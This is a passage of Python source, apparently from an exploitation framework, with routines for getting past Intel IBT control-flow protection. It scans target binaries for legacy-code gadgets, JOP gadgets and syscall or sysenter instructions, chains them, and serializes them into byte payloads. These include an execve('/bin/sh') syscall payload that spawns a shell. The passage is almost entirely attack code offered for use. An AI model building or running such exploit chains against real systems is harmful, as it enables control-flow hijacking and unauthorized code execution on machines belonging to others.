                                section_names = [b".old", b".compat", b".legacy", b".init", b".plt"]
                                for name in section_names:
                                    if name in data[max(0, pos-1000):pos]:
                                        in_legacy = True
                                        break

                            if in_legacy:
                                result["legacy_gadgets"].append({
                                    "address": base_address + pos,
                                    "pattern": pattern.hex(),
                                    "type": "legacy_function",
                                    "ibt_protected": False
                                })

                            offset = pos + 1

                            # Limit gadgets
                            if len(result["legacy_gadgets"]) >= 20:
                                break

                        if len(result["legacy_gadgets"]) >= 20:
                            break

                    if result["legacy_gadgets"]:
                        # Build legacy code chain
                        result["gadget_chain"] = self._build_legacy_chain(result["legacy_gadgets"])
                        result["payload"] = self._serialize_gadget_chain(result["gadget_chain"])
                        result["success"] = True

        except Exception as e:
            self.logger.debug(f"Legacy code abuse failed: {e}")
            result["error"] = str(e)

        return result

    def _build_legacy_chain(self, gadgets: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Build chain using legacy code gadgets."""
        # Select useful gadgets for control flow
        chain = []

        # Prioritize function prologues that can be chained
        for gadget in gadgets:
            if gadget["type"] == "legacy_function" and len(chain) < 5:
                chain.append(gadget)

        return chain

    def _ibt_jop_chain(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Build JOP chain for IBT bypass."""
        # Implementation constructs jump-oriented chain based on target
        result = {"success": False, "technique": "jop_chain", "gadget_chain": []}

        try:
            # Find JOP gadgets
            jop_gadgets = self._find_jop_gadgets(target_info)

            if len(jop_gadgets) < 3:  # Need at least 3 gadgets for a useful chain
                result["reason"] = "Insufficient JOP gadgets found"
                return result

            # Build JOP chain strategy based on target
            chain_strategy = self._determine_jop_strategy(target_info)

            # Construct the chain
            if chain_strategy == "register_based":
                # Use register-based jumps
                result["gadget_chain"] = self._build_register_jop_chain(jop_gadgets, target_info)
            elif chain_strategy == "memory_based":
                # Use memory-based jumps
                result["gadget_chain"] = self._build_memory_jop_chain(jop_gadgets, target_info)
            else:
                # Mixed approach
                result["gadget_chain"] = self._build_mixed_jop_chain(jop_gadgets, target_info)

            if result["gadget_chain"]:
                # Serialize the chain to payload
                result["payload"] = self._serialize_jop_chain(result["gadget_chain"], target_info)
                result["success"] = True
                result["chain_length"] = len(result["gadget_chain"])

        except Exception as e:
            self.logger.debug(f"JOP chain construction failed: {e}")
            result["error"] = str(e)

        return result

    def _determine_jop_strategy(self, target_info: Dict[str, Any]) -> str:
        """Determine best JOP chain strategy based on target."""
        # Analyze target to determine best approach
        if "registers_controlled" in target_info:
            controlled = target_info["registers_controlled"]
            if isinstance(controlled, list) and len(controlled) >= 2:
                return "register_based"

        if "memory_layout" in target_info:
            layout = target_info["memory_layout"]
            if isinstance(layout, dict) and layout.get("predictable_addresses", False):
                return "memory_based"

        return "mixed"

    def _build_register_jop_chain(self, gadgets: List[Dict[str, Any]], target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Build JOP chain using register-based jumps."""
        chain = []

        # Select gadgets that use controllable registers
        controllable_regs = target_info.get("registers_controlled", ["rax", "rcx", "rdx"])

        for gadget in gadgets:
            if gadget.get("register") in controllable_regs and len(chain) < 10:
                chain.append({
                    "address": gadget["address"],
                    "type": "jop_gadget",
                    "register": gadget["register"],
                    "instruction": gadget.get("type", "jmp_indirect")
                })

        return chain

    def _build_memory_jop_chain(self, gadgets: List[Dict[str, Any]], target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Build JOP chain using memory-based jumps."""
        chain = []

        # Use target_info to determine chain constraints
        max_chain_length = target_info.get("max_gadgets", 10)
        target_base = target_info.get("base_address", 0)
        self.logger.debug(f"Building memory JOP chain with max length {max_chain_length} for target base 0x{target_base:08x}")

        # Use gadgets that jump through memory locations
        for gadget in gadgets:
            if "offset" in gadget.get("register", "") and len(chain) < max_chain_length:
                # Validate gadget is within target range if specified
                if target_base == 0 or abs(gadget["address"] - target_base) < 0x100000:
                    chain.append({
                        "address": gadget["address"],
                        "type": "jop_memory",
                        "target": gadget["register"],
                        "instruction": gadget.get("type", "jmp_indirect")
                    })

        return chain

    def _build_mixed_jop_chain(self, gadgets: List[Dict[str, Any]], target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Build mixed JOP chain using various gadget types."""
        chain = []

        # Use target_info to customize chain construction
        preferred_registers = target_info.get("registers", ["eax", "ebx", "ecx", "edx"])
        target_address = target_info.get("target_address", 0)
        chain_limit = min(15, target_info.get("max_gadgets", 15))

        self.logger.debug(f"Building mixed JOP chain targeting 0x{target_address:08x} with preferred registers: {preferred_registers}")

        # Mix different gadget types for robustness
        for i, gadget in enumerate(gadgets[:chain_limit]):
            register = gadget.get("register", "")

            # Prefer gadgets that use target registers or apply filtering
            if any(reg in register for reg in preferred_registers) or i % 3 == 0:
                # Apply target_info constraints for address validation
                if target_address == 0 or abs(gadget["address"] - target_address) < 0x200000:
                    chain.append({
                        "address": gadget["address"],
                        "type": "jop_mixed",
                        "target": register if register else "unknown",
                        "instruction": gadget.get("type", "jmp_indirect"),
                        "sequence": i
                    })

        return chain

    def _serialize_jop_chain(self, chain: List[Dict[str, Any]], target_info: Dict[str, Any]) -> bytes:
        """Serialize JOP chain to executable payload."""
        payload = b""

        # Add chain addresses with proper setup
        for i, gadget in enumerate(chain):
            if self.is_x64:
                payload += struct.pack("<Q", gadget["address"])
                # Add register setup values if needed
                if gadget.get("register") and i < len(chain) - 1:
                    next_addr = chain[i + 1]["address"] if i + 1 < len(chain) else target_info.get("target_function", 0x41414141)
                    payload += struct.pack("<Q", next_addr)
            else:
                payload += struct.pack("<I", gadget["address"])
                if gadget.get("register") and i < len(chain) - 1:
                    next_addr = chain[i + 1]["address"] if i + 1 < len(chain) else target_info.get("target_function", 0x41414141)
                    payload += struct.pack("<I", next_addr)

        return payload

    def _ibt_kernel_transition(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Abuse kernel transitions for IBT bypass."""
        # Implementation uses kernel/user boundary based on target
        result = {"success": False, "technique": "kernel_transition", "transition_points": []}

        try:
            # Check if we can abuse kernel transitions
            if not self._can_abuse_kernel_transition(target_info):
                result["reason"] = "No kernel transition opportunities found"
                return result

            # Find kernel transition points
            if "binary_path" in target_info:
                with open(target_info["binary_path"], "rb") as f:
                    data = f.read(32768)  # Read first 32KB

                    # Look for syscall/sysenter instructions
                    syscall_patterns = [
                        b"\x0f\x05",      # syscall (64-bit)
                        b"\x0f\x34",      # sysenter
                        b"\xcd\x80",      # int 0x80 (32-bit Linux)
                        b"\xcd\x2e",      # int 0x2e (Windows)
                    ]

                    base_address = target_info.get("base_address", 0x400000)

                    for pattern in syscall_patterns:
                        offset = 0
                        while True:
                            pos = data.find(pattern, offset)
                            if pos == -1:
                                break

                            result["transition_points"].append({
                                "address": base_address + pos,
                                "type": self._get_syscall_type(pattern),
                                "instruction": pattern.hex(),
                                "exploitable": True
                            })

                            offset = pos + 1

                            if len(result["transition_points"]) >= 10:
                                break

                    # Look for kernel API calls
                    if self.is_windows:
                        # Windows kernel transition patterns
                        nt_api_patterns = [
                            b"NtQuery", b"NtSet", b"ZwQuery", b"ZwSet",
                            b"NtCreate", b"ZwCreate", b"NtOpen", b"ZwOpen"
                        ]

                        for pattern in nt_api_patterns:
                            if pattern in data:
                                result["transition_points"].append({
                                    "type": "nt_api_call",
                                    "api_prefix": pattern.decode('utf-8', errors='ignore'),
                                    "exploitable": True
                                })

            # Check for IOCTL/DeviceIoControl usage
            if "imports" in target_info:
                for imp in target_info["imports"]:
                    if isinstance(imp, dict):
                        func_name = imp.get("name", "").lower()
                        if "ioctl" in func_name or "deviceiocontrol" in func_name:
                            result["transition_points"].append({
                                "type": "device_control",
                                "function": imp["name"],
                                "exploitable": True
                            })

            if result["transition_points"]:
                # Build kernel transition exploit
                result["payload"] = self._build_kernel_transition_payload(
                    result["transition_points"],
                    target_info
                )
                result["success"] = True
                result["num_transitions"] = len(result["transition_points"])

        except Exception as e:
            self.logger.debug(f"Kernel transition abuse failed: {e}")
            result["error"] = str(e)

        return result

    def _get_syscall_type(self, pattern: bytes) -> str:
        """Identify syscall instruction type."""
        syscall_map = {
            b"\x0f\x05": "syscall_64",
            b"\x0f\x34": "sysenter",
            b"\xcd\x80": "int80_linux",
            b"\xcd\x2e": "int2e_windows"
        }
        return syscall_map.get(pattern, "unknown_syscall")

    def _build_kernel_transition_payload(self, transitions: List[Dict[str, Any]], target_info: Dict[str, Any]) -> bytes:
        """Build payload that exploits kernel transitions."""
        payload = b""

        # Use first suitable transition point
        for trans in transitions:
            if trans.get("exploitable"):
                if "address" in trans:
                    # Jump to syscall instruction
                    if self.is_x64:
                        payload += struct.pack("<Q", trans["address"])
                    else:
                        payload += struct.pack("<I", trans["address"])

                    # Add syscall number and arguments based on target
                    if trans["type"] == "syscall_64":
                        # Example: sys_execve syscall number
                        payload += struct.pack("<Q", 59)  # rax = 59 (execve)
                        payload += struct.pack("<Q", target_info.get("shell_addr", 0x41414141))  # rdi = "/bin/sh"

                    break

        return payload
